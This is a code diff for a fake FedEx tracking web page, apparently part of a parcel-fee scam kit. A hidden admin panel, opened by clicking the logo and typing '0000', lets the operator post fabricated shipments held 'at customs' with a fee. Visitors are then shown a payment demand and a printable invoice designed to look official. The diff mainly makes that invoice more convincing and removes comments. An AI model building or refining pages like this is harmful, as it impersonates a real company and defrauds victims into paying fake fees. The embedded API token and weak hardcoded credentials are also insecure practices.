@@ -6,34 +6,42 @@
     <title>Fedex | Global Tracking</title>
     <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
     <style>
-        :root { --p: #4D148C; --o: #FF6200; --bg: #f8f9fa; }
-        body { font-family: -apple-system, system-ui, sans-serif; margin: 0; background: var(--bg); color: #333; }
+        :root { --p: #4D148C; --o: #FF6200; --bg: #f4f4f4; }
+        body { font-family: 'Roboto', Arial, sans-serif; margin: 0; background: var(--bg); color: #333; }
         .nav { background: var(--p); padding: 15px; color: white; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:999; }
         .logo { font-size: 24px; font-weight: 900; cursor: pointer; user-select: none; }
         .wrapper { padding: 15px; max-width: 480px; margin: auto; }
         .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 5px 15px rgba(0,0,0,0.08); margin-top: 20px; }
-        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; outline: none; }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
         .btn-o { background: var(--o); color: white; margin-top: 10px; }
         
         #admin-panel { display: none; background: #222; color: white; padding: 20px; border-radius: 12px; margin-top: 20px; }
         #admin-panel input, #admin-panel select { background: #333; color: white; border: 1px solid #444; }
 
         #result { display: none; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; }
-        .status-box { padding: 10px; border-radius: 5px; text-align: center; font-weight: bold; margin-bottom: 15px; border: 1px solid #ddd; }
+        .status-box { padding: 10px; border-radius: 5px; text-align: center; font-weight: bold; margin-bottom: 15px; border: 1px solid #ddd; text-transform: uppercase; font-size: 13px; }
         .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f9f9f9; font-size: 14px; }
         .pkg-img { width: 100%; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #eee; }
         
-        #pay-box { display: none; margin-top: 15px; padding: 15px; background: #fff3cd; border-radius: 8px; color: #856404; border-left: 4px solid #ffc107; }
+        #pay-box { display: none; margin-top: 15px; padding: 15px; background: #fff3cd; border-radius: 8px; color: #856404; border-left: 4px solid #ffc107; font-size: 14px; }
 
-        /* REALISTIC INVOICE STYLING */
-        @media print { body * { visibility: hidden; } #invoice-wrap, #invoice-wrap * { visibility: visible; } #invoice-wrap { position: absolute; left: 0; top: 0; width: 100%; display: block !important; } }
-        #invoice-wrap { display: none; font-family: 'Arial', sans-serif; color: #000; padding: 40px; border: 1px solid #ccc; }
-        .inv-header { display: flex; justify-content: space-between; border-bottom: 3px solid var(--p); padding-bottom: 10px; }
-        .inv-body { margin-top: 30px; line-height: 1.6; }
-        .inv-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        .inv-table th, .inv-table td { border: 1px solid #ddd; padding: 12px; text-align: left; }
-        .inv-footer { margin-top: 50px; font-size: 12px; border-top: 1px solid #eee; padding-top: 10px; text-align: center; }
+        /* REALISTIC SINGLE-PAGE INVOICE */
+        @media print { 
+            body * { visibility: hidden; } 
+            #invoice-wrap, #invoice-wrap * { visibility: visible; } 
+            #invoice-wrap { position: absolute; left: 0; top: 0; width: 100%; display: block !important; padding: 0; margin: 0; border: none; }
+        }
+        #invoice-wrap { display: none; background: #fff; color: #000; width: 100%; max-width: 800px; margin: auto; padding: 40px; box-sizing: border-box; border: 1px solid #eee; }
+        .inv-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 40px; }
+        .inv-title { font-size: 32px; font-weight: 900; color: var(--p); }
+        .inv-label { font-size: 12px; color: #666; text-transform: uppercase; margin-bottom: 2px; }
+        .inv-val { font-size: 16px; font-weight: bold; margin-bottom: 15px; }
+        .inv-table { width: 100%; border-collapse: collapse; margin: 30px 0; }
+        .inv-table th { background: #eee; padding: 12px; text-align: left; font-size: 12px; text-transform: uppercase; }
+        .inv-table td { padding: 15px; border-bottom: 1px solid #eee; font-size: 14px; }
+        .inv-total { text-align: right; font-size: 18px; font-weight: bold; padding: 20px; background: #f9f9f9; border-radius: 4px; }
+        .footer-stamp { border-top: 2px solid var(--p); margin-top: 50px; padding-top: 10px; font-size: 10px; color: #888; text-align: center; }
     </style>
 </head>
 <body>
@@ -42,13 +50,13 @@
 
 <div class="nav">
     <div class="logo" onclick="openAdmin()">Fed<span style="color:var(--o)">ex</span></div>
-    <div style="font-size:11px">Official Secure Tracking</div>
+    <div style="font-size:11px">Official Global Tracking</div>
 </div>
 
 <div class="wrapper">
     <div class="card" id="client-view">
-        <h2 style="margin:0 0 15px 0; color:var(--p)">Track Shipment</h2>
-        <input type="text" id="trackInput" placeholder="Enter Tracking Code">
+        <h2 style="margin:0 0 15px 0; color:var(--p)">Track shipment</h2>
+        <input type="text" id="trackInput" placeholder="Enter Tracking Number">
         <button class="btn btn-o" id="mainTrackBtn" onclick="handleTracking()">TRACK</button>
 
         <div id="result">
@@ -69,10 +77,10 @@
     </div>
 
     <div id="admin-panel">
-        <h3 style="color:var(--o)">Admin Control</h3>
+        <h3>Admin Manager</h3>
         <input type="text" id="a-code" placeholder="Tracking Code">
-        <input type="text" id="a-name" placeholder="Person Name">
-        <input type="text" id="a-origin" placeholder="Original City">
+        <input type="text" id="a-name" placeholder="Client Name">
+        <input type="text" id="a-origin" placeholder="Origin City">
         <input type="text" id="a-dest" placeholder="Destination City">
         <input type="text" id="a-takeoff" placeholder="Takeoff Time">
         <input type="text" id="a-reach" placeholder="Arrival Time">
@@ -86,7 +94,6 @@
             <option value="Held at Customs">Held at Customs</option>
             <option value="Arrived (Payment needed)">Arrived (Payment needed)</option>
         </select>
-        <p style="font-size:12px">Upload Photo:</p>
         <input type="file" id="a-file" accept="image/*">
         <button class="btn btn-o" id="saveBtn" onclick="saveToCloud()">SAVE TO CLOUD</button>
         <button class="btn" style="margin-top:10px; background:#444; color:white;" onclick="location.reload()">LOGOUT</button>
@@ -94,41 +101,55 @@
 </div>
 
 <div id="invoice-wrap">
-    <div class="inv-header">
+    <div class="inv-top">
         <div>
-            <h1 style="color:var(--p); margin:0;">Fedex.</h1>
-            <p style="margin:0; font-size:14px; color:#555;">Express Shipping Service</p>
+            <div class="inv-title">FedEx<span style="color:var(--o)">.</span></div>
+            <p>International Express Shipping</p>
         </div>
-        <div style="text-align:right">
-            <h2 style="margin:0;">OFFICIAL INVOICE</h2>
-            <p style="margin:0;">ID: <span id="inv-code"></span></p>
+        <div style="text-align: right;">
+            <p style="font-size: 24px; font-weight: bold; margin: 0;">INVOICE</p>
+            <p>Ref: <span id="inv-code"></span></p>
         </div>
     </div>
-    <div class="inv-body">
-        <p><b>Date:</b> <span id="inv-date"></span></p>
-        <p><b>Bill To:</b> <span id="inv-name"></span></p>
-        <p>This document serves as an official notice for the package currently held at our clearance facility. Final delivery requires the settlement of the following administrative fees.</p>
-        
-        <table class="inv-table">
-            <thead>
-                <tr style="background:#f2f2f2;">
-                    <th>Description</th>
-                    <th>Tracking ID</th>
-                    <th>Total Due</th>
-                </tr>
-            </thead>
-            <tbody>
-                <tr>
-                    <td>International Customs & Clearance Fee</td>
-                    <td id="inv-tbl-code"></td>
-                    <td><b>$<span id="inv-fee"></span></b></td>
-                </tr>
-            </tbody>
-        </table>
+
+    <div style="display: flex; justify-content: space-between; margin-bottom: 30px;">
+        <div>
+            <div class="inv-label">Bill To:</div>
+            <div class="inv-val" id="inv-name"></div>
+        </div>
+        <div style="text-align: right;">
+            <div class="inv-label">Issue Date:</div>
+            <div class="inv-val" id="inv-date"></div>
+        </div>
     </div>
-    <div class="inv-footer">
-        <p>Thank you for choosing Fedex Express. All packages are subject to local customs regulations.</p>
-        <p><b>© 2026 Fedex Global Logistics</b></p>
+
+    <table class="inv-table">
+        <thead>
+            <tr>
+                <th>Description</th>
+                <th>Service Type</th>
+                <th>Amount</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Customs Duties & Regulatory Clearance Fees</td>
+                <td>Priority Overnight</td>
+                <td style="font-weight:bold;">$<span id="inv-fee"></span></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="inv-total">
+        TOTAL DUE: $<span id="inv-fee-total"></span>
+    </div>
+
+    <div class="inv-body" style="margin-top: 40px; font-size: 13px;">
+        <p><b>Note:</b> This shipment is currently held at our regional clearance hub. Pursuant to international trade regulations, the outstanding balance above must be settled before final dispatch to the destination address. This is a computer-generated document and does not require a signature.</p>
+    </div>
+
+    <div class="footer-stamp">
+        © 2026 FedEx Global Logistics. All rights reserved. Registered with International Customs Authority.
     </div>
 </div>
 
@@ -145,22 +166,20 @@
     const KEY = P1 + P2 + P3;
 
     function openAdmin() {
-        if(prompt("Password") === "0000" && prompt("Token") === "0000") {
+        if(prompt("Pass") === "0000" && prompt("Token") === "0000") {
             document.getElementById('client-view').style.display = 'none';
             document.getElementById('admin-panel').style.display = 'block';
         }
     }
 
-    // 1: Tracking Logic with 3-second delay
     async function handleTracking() {
         const btn = document.getElementById('mainTrackBtn');
         const input = document.getElementById('trackInput').value;
-        if(!input) return alert("Enter code");
+        if(!input) return;
 
         btn.innerText = "Tracking...";
         btn.disabled = true;
 
-        // Force 3 second wait
         setTimeout(async () => {
             await startTracking(input);
             btn.innerText = "TRACK";
@@ -172,8 +191,7 @@
         const res = await fetch(`https://api.github.com/repos/${U}/${R}/contents/data.json?v=${Date.now()}`, {
             headers: { "Authorization": `token ${KEY}` }
         });
-        
-        if(!res.ok) return alert("Database not ready.");
+        if(!res.ok) return alert("Database Error");
         
         const file = await res.json();
         const data = JSON.parse(atob(file.content));
@@ -196,7 +214,6 @@
                 img.src = s.img; img.style.display = 'block';
             }
 
-            // 3 & 4: Custom Message Logic
             const payBox = document.getElementById('pay-box');
             const payMsg = document.getElementById('pay-msg');
             
@@ -206,16 +223,14 @@
                     ? `<b>Arrived:</b> Clearance fee of <b>$${s.fee}</b> needed.` 
                     : `<b>Pending:</b> Custom fee of <b>$${s.fee}</b> needed.`;
 
-                // Prepare Invoice
+                // Single Chapter Invoice Prep
                 document.getElementById('inv-code').innerText = input;
-                document.getElementById('inv-tbl-code').innerText = input;
                 document.getElementById('inv-name').innerText = s.name;
                 document.getElementById('inv-fee').innerText = s.fee;
+                document.getElementById('inv-fee-total').innerText = s.fee;
                 document.getElementById('inv-date').innerText = s.date;
-            } else {
-                payBox.style.display = 'none';
-            }
-        } else { alert("Code not found."); }
+            } else { payBox.style.display = 'none'; }
+        } else { alert("Not Found"); }
     }
 
     async function saveToCloud() {
@@ -233,6 +248,9 @@
             });
         }
 
+        // 1: AUTO DATE (No Time)
+        const dateOnly = new Date().toLocaleDateString('en-GB');
+
         const payload = {
             name: document.getElementById('a-name').value,
             origin: document.getElementById('a-origin').value,
@@ -242,7 +260,7 @@
             fee: document.getElementById('a-fee').value,
             status: document.getElementById('a-status').value,
             img: imgBase64,
-            date: new Date().toLocaleString()
+            date: dateOnly
         };
 
         const url = `https://api.github.com/repos/${U}/${R}/contents/data.json`;
@@ -265,10 +283,9 @@
             })
         });
 
-        if(push.ok) { alert("Shipment Saved!"); location.reload(); }
-        else { alert("Push Error."); btn.disabled = false; }
+        if(push.ok) { alert("Saved!"); location.reload(); }
+        else { alert("Error"); btn.disabled = false; }
     }
 </script>
 </body>
-        </html>
-    
+</html>
